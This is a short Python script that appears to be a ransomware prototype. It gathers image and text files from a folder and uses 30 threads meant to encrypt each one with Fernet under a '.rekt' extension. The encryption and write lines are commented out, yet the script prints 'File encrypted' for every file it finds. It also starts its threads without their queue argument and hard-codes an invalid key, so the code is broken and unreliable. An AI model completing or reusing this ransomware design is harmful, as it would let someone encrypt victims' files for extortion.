import os
from queue import Queue
from threading import Thread

from cryptography.fernet import Fernet

encrypted_ext = ('.img', '.jpg', '.jpeg', '.png', '.txt',)
key = "whatttt"

# grab all files from machine
file_paths = []
for root, dirs, files, in os.walk('img/'):
    for file in files:
        file_path, file_ext = os.path.splitext(os.path.join(root, file))
        if file_ext.lower() in encrypted_ext:
            file_paths.append(os.path.abspath(os.path.join(root, file)))

# encrypt files
def encrypt(q):
    global key
    while not q.empty():
        try:
            file = q.get()
            print (file)

            with open(file, 'rb') as f:
                data = f.read()
            # create Fernet object with key
            # fernet = Fernet(key)
            # # encrypt data
            # ciphertext = fernet.encrypt(data)
            # # get name and extension
            file_name, file_ext = os.path.splitext(file)
            # output_file = f'{file_name}.rekt'
            # # write ciphertext to output file
            # with open(output_file, 'wb') as f:
            #     f.write(ciphertext)
            print(f'File encrypted: {file_name}')
        except FileNotFoundError as e:
            print(f'Not found: {file}')
        q.task_done()

q = Queue()
for file in file_paths:
    q.put(file)

for i in range(30):
    thread = Thread(target=encrypt, daemon=True)
    thread.start()